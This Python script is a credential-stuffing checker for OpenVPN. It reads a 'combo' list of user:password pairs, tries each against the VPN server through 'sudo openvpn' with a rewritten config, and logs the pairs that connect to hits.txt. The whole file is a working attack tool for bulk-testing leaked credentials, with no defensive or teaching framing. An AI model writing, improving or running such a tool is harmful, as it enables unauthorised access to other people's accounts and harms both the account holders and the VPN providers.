import os
import subprocess
import sys

assert (
    len(sys.argv) == 3
), f"Invalid arguments\n\
	 Usage: {__file__} <CONFIG> <COMBO>"

CONFIG = sys.argv[1]
COMBO = sys.argv[2]


def chenge_config_auth_type(CONFIG):
    """creates temp config file for
     new auth method (file based auth).

    Args:
        CONFIG (str): config file name

    Returns:
        str: temp config name
    """
    new_config_data = ""
    try:
        with open(CONFIG, "r") as main_config:
            for line in main_config.readlines():
                if line.startswith("auth-user-pass"):
                    new_config_data += f"auth-user-pass ./{TEMP_FILE_NAME}\n"
                else:
                    new_config_data += line
    except FileNotFoundError as err:
        err.strerror = "Config file not found"
        raise

    new_config_name = f"temp_{CONFIG}"
    remove_files(new_config_name)
    with open(new_config_name, "a+") as new_config_file:
        new_config_file.write(new_config_data)
    return new_config_name


def remove_files(*files):
    for file_name in files:
        if os.path.isfile(file_name):
            os.remove(file_name)
    return None


def create_temp_file(user, passwd, TEMP_FILE_NAME):
    """Creates a temp file that
       Openvpn config will read this file
       for username and password.

    Args:
            user (str): username
            passwd (str): password
            TEMP_FILE_NAME (str): temp file name

    Returns:
            None: nothing
    """
    remove_files(TEMP_FILE_NAME)
    with open(TEMP_FILE_NAME, "a+") as temp_file:
        temp_line = f"{user}\n{passwd}"
        temp_file.write(temp_line)
    return None


def get_conn_status(user, passwd, output):
    """Gets command output then
    checks either connection failed
    or no

    Args:
            user (str): username
            passwd (str): password
            output (str): connection output

    Returns:
            Boolean or None: if connection Success -> True
                                            if connection Failed -> False
                                            waiting -> None
    """
    if "Initialization Sequence Completed" in output:
        out = f"{user}:{passwd}\n"
        with open("hits.txt", "a+") as hit_file:
            hit_file.write(out)
            hit_file.flush()
        return True
    elif (
        len(output.strip()) == 0
        or "TLS Error" in output.strip()
        or "AUTH_FAILED" in output.strip()
        or "Restart pause, 5 second(s)" in output.strip()
    ):
        return False
    else:
        return None


def run(CONFIG, COMBO, TEMP_FILE_NAME):
    """This module gets CONFIG, COMBO files
       and extracts user and passwords
       then check them with openvpn command
       on Unix systems.
    Args:
                    CONFIG (File): OpenVpn config file
                    COMBO (File): User password files
                    TEMP_FILE_NAME (str): temp file name
    """
    try:
        with open(COMBO, "r") as passwords_files:
            for counter, line in enumerate(passwords_files.readlines()):
                user, passwd = line.strip().split(":")
                create_temp_file(user, passwd, TEMP_FILE_NAME)

                x = subprocess.Popen(
                    ["sudo", "openvpn", "--auth-nocache", "--ping-exit", "3", "--config", CONFIG],
                    stdout=subprocess.PIPE,
                    universal_newlines=True,
                )
                print(counter + 1, ") ", line.strip("\n"))
                while True:
                    output = x.stdout.readline()
                    status = get_conn_status(user, passwd, output)
                    if status:
                        print("---> Successfully Connected!", end="\n\n")
                        break
                    elif status == False:
                        print("---> Failed!", end="\n\n")
                        break
    except FileNotFoundError as err:
        err.strerror = "Combo file not found"
        raise


if __name__ == "__main__":
    TEMP_FILE_NAME = "temp.txt"
    CONFIG = chenge_config_auth_type(CONFIG)
    run(CONFIG, COMBO, TEMP_FILE_NAME)
    remove_files(TEMP_FILE_NAME, CONFIG)
